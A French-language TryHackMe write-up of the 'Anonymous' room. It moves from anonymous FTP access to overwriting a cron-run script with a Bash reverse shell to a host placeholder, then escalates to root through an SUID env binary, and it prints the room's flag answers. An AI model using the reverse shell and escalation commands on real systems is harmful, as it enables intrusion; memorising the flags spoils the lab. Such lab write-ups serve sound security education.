# TryHackMe: Anonymous

**Objectif :** exploiter un acces FTP anonyme mal securise, reutiliser un script de nettoyage modifiable pour obtenir un shell sur la machine, puis elever les privileges via un binaire SUID mal configure afin de recuperer `user.txt` et `root.txt`.

---

## Introduction

La room **Anonymous** est une machine Linux tres accessible, mais elle reste excellente pour revoir les fondamentaux :

- scan reseau
- enumeration SMB et FTP
- observation des permissions
- exploitation d'un script execute de maniere recurrente
- privilege escalation via GTFOBins

La difficulte ne vient pas d'un exploit complexe. Tout repose surtout sur une bonne lecture de l'environnement. C'est exactement le genre de machine qu'on peut rater si on se contente de lancer des outils sans interpreter ce qu'ils montrent.

---

## Task 1: Pwn

L'objectif annonce directement la couleur : trouver deux flags. Avant de penser privilege escalation, je commence par reconstituer la surface d'attaque.

### Question 1: Enumerate the machine. How many ports are open?

Je lance un scan Nmap sur les ports les plus courants, puis un scan un peu plus verbeux pour identifier les services.

```bash
nmap -sC -sV <IP>
```

Je retrouve quatre ports ouverts :

- `21/tcp`
- `22/tcp`
- `139/tcp`
- `445/tcp`

### Reponse

**How many ports are open?** `4`

### Question 2: What service is running on port 21?

Le port `21/tcp` remonte clairement comme un service FTP.

### Reponse

**Service on port 21:** `ftp`

### Question 3: What service is running on ports 139 and 445?

Les ports `139` et `445` sont typiques d'un partage SMB/Samba. Nmap le confirme.

### Reponse

**Service on ports 139 and 445:** `smb`

### Question 4: There's a share on the user's computer. What's it called?

Je verifie les partages disponibles avec `smbclient`.

```bash
smbclient -L //<IP>/ -N
```

Le partage interessant s'appelle `pics`.

Cette partie est utile, mais elle reste surtout une fausse piste partielle : on peut y telecharger des images, mais l'acces initial ne vient pas de la.

### Reponse

**Share name:** `pics`

---

## Enumeration detaillee

Comme d'habitude, apres le scan reseau, je liste les services accessibles sans identifiants.

### SMB

Le partage `pics` est visible anonymement. Je m'y connecte :

```bash
smbclient //<IP>/pics -N
```

Je peux recuperer les images presentes, mais elles n'apportent pas d'acces direct. Je les garde de cote, sans m'enteter.

### FTP

Le nom de la machine et le contexte poussent naturellement a tester une connexion FTP anonyme :

```bash
ftp <IP>
```

Identifiants :

- utilisateur : `anonymous`
- mot de passe : vide ou n'importe quelle valeur

Une fois connecte, je liste le contenu. C'est ici que les choses deviennent interessantes :

- un repertoire `scripts`
- un fichier `clean.sh`
- un fichier `removed_files.log`
- un fichier `to_do.txt`

Le message dans `to_do.txt` confirme que l'acces anonyme est un oubli de configuration. Surtout, le log laisse entendre qu'un script de nettoyage tourne regulierement.

Le point important n'est pas seulement la presence de `clean.sh`, mais le fait qu'il soit modifiable depuis le FTP.

---

## Identification de la vulnerabilite

Le coeur de la machine est la :

1. un script shell de maintenance est exposé en ecriture
2. ce script semble etre execute automatiquement
3. si je remplace son contenu par un reverse shell, le prochain lancement me donnera une session

Ce n'est pas un exploit au sens "CVE", mais une erreur d'administration tres realiste :

- acces anonyme laisse actif
- droits d'ecriture trop permissifs
- script lance par cron ou mecanisme equivalent

---

## Exploitation: remplacement de clean.sh

Je prepare un reverse shell Bash tres simple :

```bash
#!/bin/bash
bash -i >& /dev/tcp/<MON_IP>/4444 0>&1
```

Je l'enregistre localement dans `clean.sh`, puis je l'upload sur le FTP.

```bash
ftp <IP>
cd scripts
put clean.sh
```

Ensuite, j'ouvre un listener sur ma machine :

```bash
rlwrap nc -lvnp 4444
```

Apres un court delai, la connexion tombe. Le script est donc bien execute periodiquement, ce qui correspond parfaitement aux lignes repetees du fichier `removed_files.log`.

J'obtiens alors un shell sous l'utilisateur :

```text
namelessone
```

---

## Acces initial et recuperation du flag utilisateur

Le shell obtenu est rudimentaire. Je le stabilise pour faciliter la suite :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Je verifie mon contexte :

```bash
whoami
id
pwd
ls -la
```

Le home de `namelessone` contient `user.txt`.

```bash
cat /home/namelessone/user.txt
```

### Reponse

**user.txt:** `90d6f992585815ff991e68748c414740`

---

## Raisonnement de post-exploitation

A ce stade, j'ai un acces utilisateur. Je dois maintenant chercher un vecteur de privilege escalation.

Les pistes logiques sont les suivantes :

- sudo rights
- capabilities
- cron jobs
- fichiers SUID
- groupes interessants

Le compte n'ayant pas de mot de passe connu, `sudo -l` n'est pas la piste la plus prometteuse. Je m'oriente vers les SUID.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Parmi les binaires remontes, un element sort du lot :

```text
/usr/bin/env
```

`env` n'est pas un binaire qui devrait donner quoi que ce soit d'interessant avec SUID. C'est justement ce caractere inhabituel qui attire l'attention.

En recoupant avec GTFOBins, on retrouve un abus connu : si `env` possede le bit SUID, il peut lancer un shell en conservant l'effective UID root.

---

## Privilege Escalation

J'exploite donc directement le binaire :

```bash
/usr/bin/env /bin/sh -p
```

L'option `-p` demande au shell de preserver les privileges effectifs. Sur cette machine, cela suffit pour obtenir un shell root.

Je confirme :

```bash
whoami
id
```

Le resultat attendu est `root`.

Je peux alors lire le dernier flag :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `4d930091c31a622a7ed10f27999af363`

---

## Resume des reponses de la room

- How many ports are open? `4`
- What service is running on port 21? `ftp`
- What service is running on ports 139 and 445? `smb`
- There's a share on the user's computer. What's it called? `pics`
- user.txt `90d6f992585815ff991e68748c414740`
- root.txt `4d930091c31a622a7ed10f27999af363`

---

## Commandes importantes et pourquoi elles comptent

### Scan reseau

```bash
nmap -sC -sV <IP>
```

Permet d'identifier rapidement les services accessibles et d'orienter l'enumeration vers FTP et SMB.

### Enumeration SMB

```bash
smbclient -L //<IP>/ -N
```

Valide l'existence du partage `pics`, utile pour comprendre l'exposition de la machine meme si ce n'est pas le point d'entree final.

### Connexion FTP anonyme

```bash
ftp <IP>
```

C'est la que se trouve le veritable probleme : l'ecriture sur un script execute automatiquement.

### Listener

```bash
rlwrap nc -lvnp 4444
```

Necessaire pour recevoir le reverse shell declenche par `clean.sh`.

### Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Rend le shell plus exploitable pour l'enumeration et la privesc.

### Recherche SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

Commande classique, mais indispensable ici pour repérer `env`.

### Abus GTFOBins

```bash
/usr/bin/env /bin/sh -p
```

Transformation directe d'un acces utilisateur en shell root.

---

## Ce qu'il fallait comprendre

Cette room est volontairement simple, mais elle enseigne quelque chose de tres utile : l'exploitation la plus rentable n'est pas toujours "bruyante".

Je n'ai pas eu besoin :

- d'un brute force
- d'un exploit kernel
- d'un framework lourd

J'ai seulement enchaine :

1. bonne enumeration
2. lecture attentive des fichiers disponibles
3. abus d'un script ecrit par erreur
4. verification des SUID
5. utilisation d'une technique GTFOBins documentee

---

## Conclusion

**Anonymous** est un excellent rappel des fondamentaux Linux. L'acces initial vient d'une erreur d'exposition tres concrete, puis la privesc d'une mauvaise hygiene SUID. Ce type de chaine d'attaque reste totalement credible en environnement reel, surtout sur des serveurs administres rapidement ou sans revue de permissions.

***Auteur*** *: Saad Idrissi*
